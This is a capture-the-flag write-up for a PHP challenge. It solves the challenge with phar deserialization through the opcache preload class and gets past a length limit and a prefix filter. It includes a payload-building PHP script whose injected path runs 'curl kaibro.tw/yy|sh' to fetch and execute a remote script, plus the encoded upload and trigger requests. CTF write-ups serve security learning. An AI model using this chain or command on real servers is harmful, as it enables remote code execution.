# King of PHP

## Description:

> PHP is so easy, right?

> compress.zlib://phar://xxx

preload.php:

```php
<?php

class InitialOperation {

    private $path = "/tmp/*";

    function __destruct() {
        exec("rm ".$this->path);
    }

}
```

## Solution:

php 7.4 supports opcache preload. This can be seen in `phpinfo()` or `php.ini`.

First, use `file_put_contents()` to upload phar.

- bypass length limit: input c as an array
- bypass filter for prefix "p": use any available php wrapper. E.g. `compress.zlib://phar:///xxxxxx`

Payload:

```php
<?php

class InitialOperation {

    private $path = "/tmp/123; curl kaibro.tw/yy|sh";

    function __destruct() {
        exec("rm ".$this->path);
    }

}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new InitialOperation();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

Upload phar:

```
/?c[]=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A%96%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%60%00%00%00O%3A16%3A%22InitialOperation%22%3A1%3A%7Bs%3A22%3A%22%00InitialOperation%00path%22%3Bs%3A30%3A%22%2Ftmp%2F123%3B+curl+kaibro.tw%2Fyy%7Csh%22%3B%7D%08%00%00%00test.txt%04%00%00%00lU%19%5E%04%00%00%00%0C%7E%7F%D8%B4%01%00%00%00%00%00%00testCR%0A%922%01%91%AC%01f%87%82%AC%C6i%CE%3Bg%1F8%02%00%00%00GBMB
```

Trigger deserialization:

```
/?f=compress.zlib://phar:///tmp/xxxxxxxxx
```

`FLAG{oh_php7.4_preload_so__coool!}`
